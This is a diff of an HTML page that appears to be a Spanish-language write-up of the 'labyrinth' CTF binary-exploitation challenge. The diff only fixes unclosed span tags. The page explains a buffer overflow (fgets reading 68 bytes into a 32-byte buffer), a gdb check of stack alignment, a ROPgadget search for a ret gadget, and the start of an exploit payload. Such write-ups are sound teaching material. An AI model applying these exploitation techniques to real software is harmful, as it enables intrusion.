@@ -88,7 +88,7 @@ RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
 
 <span class="code-magenta">Would you like to change the door you chose?</span>
 
-<span class="code-magenta">&gt;&gt;
+<span class="code-magenta">&gt;&gt;</span>
 </code></pre></div><h3 id="vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></h3><p>El binario es vulnerable a <em>Buffer Overflow</em> porque existe una variable llamada <code>data</code> que tiene 32 bytes reservados como <em>buffer</em>, pero el programa utiliza <code>fgets(data, 68, stdin)</code> y lee hasta 68 bytes de <code>stdin</code>, sobrepasando el <em>buffer</em> reservado si la longitud de los datos de entrada es mayor que 32 bytes.</p><p>Podemos verificar que el programa se rompe en esta situación:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./labyrinth</span>
 
 <span class="code-magenta">▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span>
@@ -281,7 +281,7 @@ Starting program: ./labyrinth
 <span class="code-green">gef➤  </span>p/x $rsp
 $2 = 0x7ffe79e99be8
 </code></pre></div><p>Esta instrucción requiere que la pila se alinee a 16 bits (es decir, el valor de <code>$rsp</code> debe terminar en <code>0</code> para ser un múltiplo de 16). Podemos resolver este problema de alineación de la pila (<em>stack alignment</em>) utilizando un gadget <code>ret</code> justo antes de llamar a <code>escape_plan</code>. Para esto, usaremos <code>ROPgadget</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">labyrinth</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': ret$'</span>  
-0x0000000000401016 <span class="code-red">: ret
+0x0000000000401016 <span class="code-red">: ret</span>
 </code></pre></div><p>Este valor en el <em>payload</em> resolverá el problema:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">401016</span>
 
 <span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
